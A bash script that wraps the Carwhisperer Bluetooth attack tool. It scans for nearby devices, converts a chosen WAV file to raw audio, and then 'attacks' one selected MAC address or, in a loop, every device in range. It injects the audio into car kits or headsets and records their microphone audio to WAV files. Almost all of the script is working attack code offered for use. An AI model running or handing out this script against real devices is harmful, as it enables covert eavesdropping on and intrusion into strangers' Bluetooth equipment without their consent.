#!/bin/bash

exec_path=".scripts/carwhisperer/carwhisperer"
message_file=".scripts/carwhisperer/message.raw"
output_dir=".scripts/carwhisperer/output"
output_raw=".scripts/carwhisperer/out.raw"
output_wav="out" # .wav is added later in the script

rm -f /tmp/scan.txt /tmp/macs.txt > /dev/null
rm -f $message_file
rm -f $output_dir/* > /dev/null

echo -e "\nWAV files need to be put in .scripts/carwhisperer\n"
read -p "WAV file name?: " file

sox -t wav -r 44100 -c 2 ".scripts/carwhisperer/$file" -t raw -r 8000 -c 1 -e signed-integer -b 16 "$message_file"

function cleanup() {
        killall carwhisperer 
        killall carwhisperer.sh
        exit 0
}

trap cleanup SIGINT SIGTSTP

sudo systemctl restart bluetooth # Restarts the bluetooth service to avoid errors
sleep 2
sudo rfkill unblock bluetooth # Unlock bluetooth if rfkill disables it (useful for external bluetooth adapters)
sudo btmgmt --index $INTERFACE_BT power on # Power on the interface

echo -e "\nScanning...\n"
sudo btmgmt --index $INTERFACE_BT find | tee /tmp/scan.txt # Start the scan


# Format everything
echo -e "\n"
awk '
/dev_found/ {
    if (mac) {
        printf "%-20s %-10s %-5s %-30s\n", mac, type, rssi, name
    }
    mac = $3;
    type = $5;
    name = "(not available)"; # Default name
    rssi = "N/A";            # Default RSSI
    for (i = 6; i <= NF; i++) {
        if ($i == "rssi") {
            rssi = $(i+1);
            break;
        }
    }
}
/name/ {
    sub(/^name /, "");
    name = $0;
}
END {
    if (mac) {
        printf "%-20s %-10s %-5s %-30s\n", mac, type, rssi, name
    }
}' /tmp/scan.txt | sort -k3 -nr

grep "dev_found" /tmp/scan.txt | awk '{print $3}' > /tmp/macs.txt
echo -e "\nMACs formatted\n"


read -p "attack mode? (1: Attack selected mac | 2: Attack all): " attack_mode

if [ ${attack_mode} = "1" ]; then
	read -p "bssid?: " bssid
	rm -f "$output_raw"
	./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$bssid"
	if [ -f "$output_raw" ]; then
		sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "${output_dir}/${output_wav}.wav"
		echo "File saved to ${output_wav}.wav"
	fi
	

elif [ ${attack_mode} = "2" ]; then
	echo -e "\nAll outputs are stored in the output directory\n"
	counter=0
        echo "Press ctrl+c to stop the attack"
        while true; do
                while IFS= read -r line; do # Reads an input from a file line-by-line
			rm -f "$output_raw"
                        echo "Now attacking: $line"
			./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$line"
			if [ -f "$output_raw" ]; then
				sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "${output_dir}/${output_wav}-${counter}.wav"
        			echo "File saved to ${output_wav}-${counter}.wav"
			fi
			((counter++))
                done < /tmp/macs.txt
        done
else
        echo "Enter a valid mode"
        exit 1
fi
